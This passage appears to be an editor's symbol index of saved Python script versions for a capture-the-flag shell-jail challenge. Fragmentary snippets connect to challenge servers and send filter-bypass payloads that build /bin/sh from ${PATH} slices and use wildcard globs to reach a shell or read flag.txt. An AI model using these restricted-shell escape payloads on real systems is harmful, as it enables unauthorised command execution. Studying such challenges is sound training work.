        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515225120",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515225159",
        "description": ".history.sandbox_buster_20250515225159",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515225159",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515225159",
        "description": ".history.sandbox_buster_20250515225159",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=10).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515225159",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515225159",
        "description": ".history.sandbox_buster_20250515225159",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515225159",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515225159",
        "description": ".history.sandbox_buster_20250515225159",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515225159",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515225159",
        "description": ".history.sandbox_buster_20250515225159",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515225159",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515225159",
        "description": ".history.sandbox_buster_20250515225159",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515225159",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_escape_20250517152436",
        "description": ".history.sandbox_escape_20250517152436",
        "peekOfCode": "def connect_to_service():\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(10)\n        sock.connect((HOST, PORT))\n        print(f\"[+] Connected to {HOST}:{PORT}\")\n        # Receive initial banner\n        banner = sock.recv(4096).decode('utf-8', errors='ignore')\n        print(\"[+] Banner received:\")",
        "detail": ".history.sandbox_escape_20250517152436",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_escape_20250517152436",
        "description": ".history.sandbox_escape_20250517152436",
        "peekOfCode": "def send_payload(sock, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        sock.sendall((payload + '\\n').encode())\n        time.sleep(1)  # Give the server time to respond\n        # Receive response\n        response = sock.recv(4096).decode('utf-8', errors='ignore')\n        print(\"[*] Response:\")\n        print(response)",
        "detail": ".history.sandbox_escape_20250517152436",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_escape_20250517152436",
        "description": ".history.sandbox_escape_20250517152436",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox escape tool.\"\"\"\n    results = []\n    sock = connect_to_service()\n    if not sock:\n        sys.exit(1)\n    try:\n        for i, payload in enumerate(payloads):\n            print(f\"\\n[*] Testing payload {i+1}/{len(payloads)}\")\n            result = send_payload(sock, payload)",
        "detail": ".history.sandbox_escape_20250517152436",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_escape_20250517152436",
        "description": ".history.sandbox_escape_20250517152436",
        "peekOfCode": "HOST = \"94.237.120.71\"\nPORT = 34065\n# Payloads designed for the specific character set: ^[0-9${}/?\"[:space:]:&>_=()]+$\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory",
        "detail": ".history.sandbox_escape_20250517152436",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_escape_20250517152436",
        "description": ".history.sandbox_escape_20250517152436",
        "peekOfCode": "PORT = 34065\n# Payloads designed for the specific character set: ^[0-9${}/?\"[:space:]:&>_=()]+$\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type",
        "detail": ".history.sandbox_escape_20250517152436",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.sandbox_escape_20250517152436",
        "description": ".history.sandbox_escape_20250517152436",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user\n    # Directory exploration using wildcards",
        "detail": ".history.sandbox_escape_20250517152436",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_escape_20250517152608",
        "description": ".history.sandbox_escape_20250517152608",
        "peekOfCode": "def connect_to_service():\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(10)\n        sock.connect((HOST, PORT))\n        print(f\"[+] Connected to {HOST}:{PORT}\")\n        # Receive initial banner\n        banner = sock.recv(4096).decode('utf-8', errors='ignore')\n        print(\"[+] Banner received:\")",
        "detail": ".history.sandbox_escape_20250517152608",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_escape_20250517152608",
        "description": ".history.sandbox_escape_20250517152608",
        "peekOfCode": "def send_payload(sock, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        sock.sendall((payload + '\\n').encode())\n        time.sleep(1)  # Give the server time to respond\n        # Receive response\n        response = sock.recv(4096).decode('utf-8', errors='ignore')\n        print(\"[*] Response:\")\n        print(response)",
        "detail": ".history.sandbox_escape_20250517152608",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_escape_20250517152608",
        "description": ".history.sandbox_escape_20250517152608",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox escape tool.\"\"\"\n    results = []\n    sock = connect_to_service()\n    if not sock:\n        sys.exit(1)\n    try:\n        for i, payload in enumerate(payloads):\n            print(f\"\\n[*] Testing payload {i+1}/{len(payloads)}\")\n            result = send_payload(sock, payload)",
        "detail": ".history.sandbox_escape_20250517152608",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_escape_20250517152608",
        "description": ".history.sandbox_escape_20250517152608",
        "peekOfCode": "HOST = \"94.237.123.87\"\nPORT = 44123\n# Payloads designed for the specific character set: ^[0-9${}/?\"[:space:]:&>_=()]+$\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory",
        "detail": ".history.sandbox_escape_20250517152608",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_escape_20250517152608",
        "description": ".history.sandbox_escape_20250517152608",
        "peekOfCode": "PORT = 44123\n# Payloads designed for the specific character set: ^[0-9${}/?\"[:space:]:&>_=()]+$\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type",
        "detail": ".history.sandbox_escape_20250517152608",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.sandbox_escape_20250517152608",
        "description": ".history.sandbox_escape_20250517152608",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user\n    # Directory exploration using wildcards",
        "detail": ".history.sandbox_escape_20250517152608",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.send_nc_payloads_20250517145428",
        "description": ".history.send_nc_payloads_20250517145428",
        "peekOfCode": "def send_payload(ip, port, payload):\n    \"\"\"Sends a single payload to the target and returns the response.\"\"\"\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((ip, port))\n            s.sendall(payload.encode())\n            response = s.recv(4096) # Receive up to 4096 bytes\n            return response.decode()\n    except ConnectionRefusedError:\n        return f\"Connection refused by {ip}:{port}\"",
        "detail": ".history.send_nc_payloads_20250517145428",
        "documentation": {}
    },
    {
        "label": "recv_until_prompt",
        "kind": 2,
        "importPath": ".history.send_payload._20250515223751",
        "description": ".history.send_payload._20250515223751",
        "peekOfCode": "def recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:\n            break\n        buffer += data\n    return buffer\ntry:\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:",
        "detail": ".history.send_payload._20250515223751",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.send_payload._20250515223751",
        "description": ".history.send_payload._20250515223751",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\n# Payload to read flag.txt using wildcard expansion\npayload = \"/???/?????????????????/????????? >&1\"\n# Prompt to wait for before sending the payload\nPROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)",
        "detail": ".history.send_payload._20250515223751",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.send_payload._20250515223751",
        "description": ".history.send_payload._20250515223751",
        "peekOfCode": "PORT = 34445\n# Payload to read flag.txt using wildcard expansion\npayload = \"/???/?????????????????/????????? >&1\"\n# Prompt to wait for before sending the payload\nPROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:",
        "detail": ".history.send_payload._20250515223751",
        "documentation": {}
    },
    {
        "label": "payload",
        "kind": 5,
        "importPath": ".history.send_payload._20250515223751",
        "description": ".history.send_payload._20250515223751",
        "peekOfCode": "payload = \"/???/?????????????????/????????? >&1\"\n# Prompt to wait for before sending the payload\nPROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:\n            break\n        buffer += data",
        "detail": ".history.send_payload._20250515223751",
        "documentation": {}
    },
    {
        "label": "PROMPT",
        "kind": 5,
        "importPath": ".history.send_payload._20250515223751",
        "description": ".history.send_payload._20250515223751",
        "peekOfCode": "PROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:\n            break\n        buffer += data\n    return buffer\ntry:",
        "detail": ".history.send_payload._20250515223751",
        "documentation": {}
    },
    {
        "label": "recv_until_prompt",
        "kind": 2,
        "importPath": ".history.send_payload._20250517034158",
        "description": ".history.send_payload._20250517034158",
        "peekOfCode": "def recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:\n            break\n        buffer += data\n    return buffer\ntry:\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:",
        "detail": ".history.send_payload._20250517034158",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.send_payload._20250517034158",
        "description": ".history.send_payload._20250517034158",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\n# Payload to read flag.txt using wildcard expansion\npayload = \"/???/??? ?????\"\n# Prompt to wait for before sending the payload\nPROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)",
        "detail": ".history.send_payload._20250517034158",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.send_payload._20250517034158",
        "description": ".history.send_payload._20250517034158",
        "peekOfCode": "PORT = 34445\n# Payload to read flag.txt using wildcard expansion\npayload = \"/???/??? ?????\"\n# Prompt to wait for before sending the payload\nPROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:",
        "detail": ".history.send_payload._20250517034158",
        "documentation": {}
    },
    {
        "label": "payload",
        "kind": 5,
        "importPath": ".history.send_payload._20250517034158",
        "description": ".history.send_payload._20250517034158",
        "peekOfCode": "payload = \"/???/??? ?????\"\n# Prompt to wait for before sending the payload\nPROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:\n            break\n        buffer += data",
        "detail": ".history.send_payload._20250517034158",
        "documentation": {}
    },
    {
        "label": "PROMPT",
        "kind": 5,
        "importPath": ".history.send_payload._20250517034158",
        "description": ".history.send_payload._20250517034158",
        "peekOfCode": "PROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:\n            break\n        buffer += data\n    return buffer\ntry:",
        "detail": ".history.send_payload._20250517034158",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.send_payloads_20250517151738",
        "description": ".history.send_payloads_20250517151738",
        "peekOfCode": "def send_payload(payload):\n    try:\n        with socket.create_connection((HOST, PORT), timeout=3) as s:\n            s.sendall(payload.encode() + b'\\n')\n            time.sleep(0.5)  # wait for response\n            response = s.recv(4096)\n            return response.decode(errors='ignore')\n    except Exception as e:\n        return f\"[ERROR] {e}\"\ndef main():",
        "detail": ".history.send_payloads_20250517151738",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.send_payloads_20250517151738",
        "description": ".history.send_payloads_20250517151738",
        "peekOfCode": "def main():\n    for payload in test_payloads:\n        print(f\"\\n[>>] Payload: {repr(payload)}\")\n        output = send_payload(payload)\n        print(f\"[<<] Response:\\n{output}\\n{'=' * 50}\")\nif __name__ == \"__main__\":\n    main()",
        "detail": ".history.send_payloads_20250517151738",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.send_payloads_20250517151738",
        "description": ".history.send_payloads_20250517151738",
        "peekOfCode": "HOST = '94.237.123.87'\nPORT = 44123\n# Payloads based on:\n# - Arithmetic expansion (to try implicit command execution)\n# - Wildcard probing (for guessing commands/paths)\n# - Leading space bypass (to bypass character filter)\n# - File descriptor redirection (to test output on higher FDs)\ntest_payloads = [\n    # Arithmetic expansions that yield numeric results (could trigger commands like `4`, `5`, `6`, etc.)\n    \" $((2+2))\", ",
        "detail": ".history.send_payloads_20250517151738",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.send_payloads_20250517151738",
        "description": ".history.send_payloads_20250517151738",
        "peekOfCode": "PORT = 44123\n# Payloads based on:\n# - Arithmetic expansion (to try implicit command execution)\n# - Wildcard probing (for guessing commands/paths)\n# - Leading space bypass (to bypass character filter)\n# - File descriptor redirection (to test output on higher FDs)\ntest_payloads = [\n    # Arithmetic expansions that yield numeric results (could trigger commands like `4`, `5`, `6`, etc.)\n    \" $((2+2))\", \n    \" $((3+2))\", ",
        "detail": ".history.send_payloads_20250517151738",
        "documentation": {}
    },
    {
        "label": "test_payloads",
        "kind": 5,
        "importPath": ".history.send_payloads_20250517151738",
        "description": ".history.send_payloads_20250517151738",
        "peekOfCode": "test_payloads = [\n    # Arithmetic expansions that yield numeric results (could trigger commands like `4`, `5`, `6`, etc.)\n    \" $((2+2))\", \n    \" $((3+2))\", \n    \" $((10-5))\", \n    \" $((6))\", \n    \" $((7))\", \n    \" $((8))\", \n    \" $((9))\", \n    \" $((10))\",",
        "detail": ".history.send_payloads_20250517151738",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.send_payloads_20250517152619",
        "description": ".history.send_payloads_20250517152619",
        "peekOfCode": "def send_payload(payload):\n    try:\n        with socket.create_connection((HOST, PORT), timeout=3) as s:\n            s.sendall(payload.encode() + b'\\n')\n            time.sleep(0.5)  # wait for response\n            response = s.recv(4096)\n            return response.decode(errors='ignore')\n    except Exception as e:\n        return f\"[ERROR] {e}\"\ndef main():",
        "detail": ".history.send_payloads_20250517152619",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.send_payloads_20250517152619",
        "description": ".history.send_payloads_20250517152619",
        "peekOfCode": "def main():\n    for payload in test_payloads:\n        print(f\"\\n[>>] Payload: {repr(payload)}\")\n        output = send_payload(payload)\n        print(f\"[<<] Response:\\n{output}\\n{'=' * 50}\")\nif __name__ == \"__main__\":\n    main()",
        "detail": ".history.send_payloads_20250517152619",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.send_payloads_20250517152619",
        "description": ".history.send_payloads_20250517152619",
        "peekOfCode": "HOST = '94.237.123.87'\nPORT = 44123\ndef send_payload(payload):\n    try:\n        with socket.create_connection((HOST, PORT), timeout=3) as s:\n            s.sendall(payload.encode() + b'\\n')\n            time.sleep(0.5)  # wait for response\n            response = s.recv(4096)\n            return response.decode(errors='ignore')\n    except Exception as e:",
        "detail": ".history.send_payloads_20250517152619",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.send_payloads_20250517152619",
        "description": ".history.send_payloads_20250517152619",
        "peekOfCode": "PORT = 44123\ndef send_payload(payload):\n    try:\n        with socket.create_connection((HOST, PORT), timeout=3) as s:\n            s.sendall(payload.encode() + b'\\n')\n            time.sleep(0.5)  # wait for response\n            response = s.recv(4096)\n            return response.decode(errors='ignore')\n    except Exception as e:\n        return f\"[ERROR] {e}\"",
        "detail": ".history.send_payloads_20250517152619",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.temp_send_20250516192003",
        "description": ".history.temp_send_20250516192003",
        "peekOfCode": "HOST = \"94.237.120.71\"\nPORT = 34065\nTIMEOUT = 3\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((HOST, PORT))\n    time.sleep(0.1)\n    s.sendall(b\"/???/??? ?\\n\")\n    response = s.recv(4096)\n    print(response.decode('utf-8', errors='ignore'))",
        "detail": ".history.temp_send_20250516192003",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.temp_send_20250516192003",
        "description": ".history.temp_send_20250516192003",
        "peekOfCode": "PORT = 34065\nTIMEOUT = 3\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((HOST, PORT))\n    time.sleep(0.1)\n    s.sendall(b\"/???/??? ?\\n\")\n    response = s.recv(4096)\n    print(response.decode('utf-8', errors='ignore'))\n    s.close()",
        "detail": ".history.temp_send_20250516192003",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.temp_send_20250516192003",
        "description": ".history.temp_send_20250516192003",
        "peekOfCode": "TIMEOUT = 3\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((HOST, PORT))\n    time.sleep(0.1)\n    s.sendall(b\"/???/??? ?\\n\")\n    response = s.recv(4096)\n    print(response.decode('utf-8', errors='ignore'))\n    s.close()\nexcept Exception as e:",
        "detail": ".history.temp_send_20250516192003",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.temp_send_20250517043950",
        "description": ".history.temp_send_20250517043950",
        "peekOfCode": "HOST = \"94.237.120.71\"\nPORT = 34065\nTIMEOUT = 3\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((HOST, PORT))\n    time.sleep(0.1)\n    s.sendall(b\"/???/??? ?\\n\")\n    response = s.recv(4096)\n    print(response.decode('utf-8', errors='ignore'))",
        "detail": ".history.temp_send_20250517043950",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.temp_send_20250517043950",
        "description": ".history.temp_send_20250517043950",
        "peekOfCode": "PORT = 34065\nTIMEOUT = 3\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((HOST, PORT))\n    time.sleep(0.1)\n    s.sendall(b\"/???/??? ?\\n\")\n    response = s.recv(4096)\n    print(response.decode('utf-8', errors='ignore'))\n    s.close()",
        "detail": ".history.temp_send_20250517043950",
        "documentation": {}
    },
    {
        "label": "TIMEOUT",
        "kind": 5,
        "importPath": ".history.temp_send_20250517043950",
        "description": ".history.temp_send_20250517043950",
        "peekOfCode": "TIMEOUT = 3\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((HOST, PORT))\n    time.sleep(0.1)\n    s.sendall(b\"/???/??? ?\\n\")\n    response = s.recv(4096)\n    print(response.decode('utf-8', errors='ignore'))\n    s.close()\nexcept Exception as e:",
        "detail": ".history.temp_send_20250517043950",
        "documentation": {}
    },
    {
        "label": "send_command",
        "kind": 2,
        "importPath": ".history.test_server_response_20250517145816",
        "description": ".history.test_server_response_20250517145816",
        "peekOfCode": "def send_command(command):\n    \"\"\"Sends a command to the server and returns the response.\"\"\"\n    # TODO: Implement sending the command based on http_method and server_url\n    # This is a placeholder implementation\n    print(f\"Sending command: {command}\")\n    try:\n        if http_method.upper() == \"POST\":\n            response = requests.post(server_url, data={'command': command}) # Assuming 'command' is the parameter name\n        elif http_method.upper() == \"GET\":\n            response = requests.get(server_url, params={'command': command}) # Assuming 'command' is the parameter name",
        "detail": ".history.test_server_response_20250517145816",
        "documentation": {}
    },
    {
        "label": "available_chars",
        "kind": 5,
        "importPath": ".history.test_server_response_20250517145816",
        "description": ".history.test_server_response_20250517145816",
        "peekOfCode": "available_chars = \"0123456789${}/?\\\"[:space:]:&>_=()\"\n# Attack Vectors and Target Commands from attack-plan.md\nattack_vectors = [\n    \"${PATH:0:1}\",  # Extract first character of PATH\n    \"$(${PATH:0:1}???${PATH:5:1}${PATH:11:1})\", # Attempt to construct /bin/sh\n    \"$?\", # Exit status\n    \"$$\", # Process ID\n    \"$(/?/?/???)\", # Wildcard usage\n    \"$PATH\",\n    \"$HOME\",",
        "detail": ".history.test_server_response_20250517145816",
        "documentation": {}
    },
    {
        "label": "attack_vectors",
        "kind": 5,
        "importPath": ".history.test_server_response_20250517145816",
        "description": ".history.test_server_response_20250517145816",
        "peekOfCode": "attack_vectors = [\n    \"${PATH:0:1}\",  # Extract first character of PATH\n    \"$(${PATH:0:1}???${PATH:5:1}${PATH:11:1})\", # Attempt to construct /bin/sh\n    \"$?\", # Exit status\n    \"$$\", # Process ID\n    \"$(/?/?/???)\", # Wildcard usage\n    \"$PATH\",\n    \"$HOME\",\n    \"$USER\",\n    \"$SHELL\",",
        "detail": ".history.test_server_response_20250517145816",
        "documentation": {}
    },
    {
        "label": "target_commands",
        "kind": 5,
        "importPath": ".history.test_server_response_20250517145816",
        "description": ".history.test_server_response_20250517145816",
        "peekOfCode": "target_commands = [\n    \"/bin/sh\",\n    \"/bin/bash\",\n    \"ls\",\n    \"/bin/ls\",\n    \"cat flag.txt\",\n    \"/bin/cat flag*\",\n]\n# TODO: Get server URL and method from user\nserver_url = \"\" # Placeholder",
        "detail": ".history.test_server_response_20250517145816",
        "documentation": {}
    },
    {
        "label": "server_url",
        "kind": 5,
        "importPath": ".history.test_server_response_20250517145816",
        "description": ".history.test_server_response_20250517145816",
        "peekOfCode": "server_url = \"\" # Placeholder\nhttp_method = \"POST\" # Placeholder\ndef send_command(command):\n    \"\"\"Sends a command to the server and returns the response.\"\"\"\n    # TODO: Implement sending the command based on http_method and server_url\n    # This is a placeholder implementation\n    print(f\"Sending command: {command}\")\n    try:\n        if http_method.upper() == \"POST\":\n            response = requests.post(server_url, data={'command': command}) # Assuming 'command' is the parameter name",
        "detail": ".history.test_server_response_20250517145816",
        "documentation": {}
    },
    {
        "label": "http_method",
        "kind": 5,
        "importPath": ".history.test_server_response_20250517145816",
        "description": ".history.test_server_response_20250517145816",
        "peekOfCode": "http_method = \"POST\" # Placeholder\ndef send_command(command):\n    \"\"\"Sends a command to the server and returns the response.\"\"\"\n    # TODO: Implement sending the command based on http_method and server_url\n    # This is a placeholder implementation\n    print(f\"Sending command: {command}\")\n    try:\n        if http_method.upper() == \"POST\":\n            response = requests.post(server_url, data={'command': command}) # Assuming 'command' is the parameter name\n        elif http_method.upper() == \"GET\":",
        "detail": ".history.test_server_response_20250517145816",
        "documentation": {}
    },
    {
        "label": "send_command",
        "kind": 2,
        "importPath": ".history.test_server_response_20250517145959",
        "description": ".history.test_server_response_20250517145959",
        "peekOfCode": "def send_command(command):\n    \"\"\"Sends a command to the server using a socket and returns the response.\"\"\"\n    print(f\"Sending command: {command}\")\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((server_ip, server_port))\n            s.sendall(command.encode())\n            response = s.recv(4096) # Receive up to 4096 bytes\n            print(f\"Received response:\")\n            print(response.decode())",
        "detail": ".history.test_server_response_20250517145959",
        "documentation": {}
    },
    {
        "label": "available_chars",
        "kind": 5,
        "importPath": ".history.test_server_response_20250517145959",
        "description": ".history.test_server_response_20250517145959",
        "peekOfCode": "available_chars = \"0123456789${}/?\\\"[:space:]:&>_=()\"\n# Attack Vectors and Target Commands from attack-plan.md\nattack_vectors = [\n    \"${PATH:0:1}\",  # Extract first character of PATH\n    \"$(${PATH:0:1}???${PATH:5:1}${PATH:11:1})\", # Attempt to construct /bin/sh\n    \"$?\", # Exit status\n    \"$$\", # Process ID\n    \"$(/?/?/???)\", # Wildcard usage\n    \"$PATH\",\n    \"$HOME\",",
        "detail": ".history.test_server_response_20250517145959",
        "documentation": {}
    },
    {
        "label": "attack_vectors",
        "kind": 5,
        "importPath": ".history.test_server_response_20250517145959",
        "description": ".history.test_server_response_20250517145959",
        "peekOfCode": "attack_vectors = [\n    \"${PATH:0:1}\",  # Extract first character of PATH\n    \"$(${PATH:0:1}???${PATH:5:1}${PATH:11:1})\", # Attempt to construct /bin/sh\n    \"$?\", # Exit status\n    \"$$\", # Process ID\n    \"$(/?/?/???)\", # Wildcard usage\n    \"$PATH\",\n    \"$HOME\",\n    \"$USER\",\n    \"$SHELL\",",
        "detail": ".history.test_server_response_20250517145959",
        "documentation": {}
    },
    {
        "label": "target_commands",
        "kind": 5,
        "importPath": ".history.test_server_response_20250517145959",
        "description": ".history.test_server_response_20250517145959",
        "peekOfCode": "target_commands = [\n    \"/bin/sh\",\n    \"/bin/bash\",\n    \"ls\",\n    \"/bin/ls\",\n    \"cat flag.txt\",\n    \"/bin/cat flag*\",\n]\n# TODO: Get server IP and port from user\nserver_ip = \"\" # Placeholder",
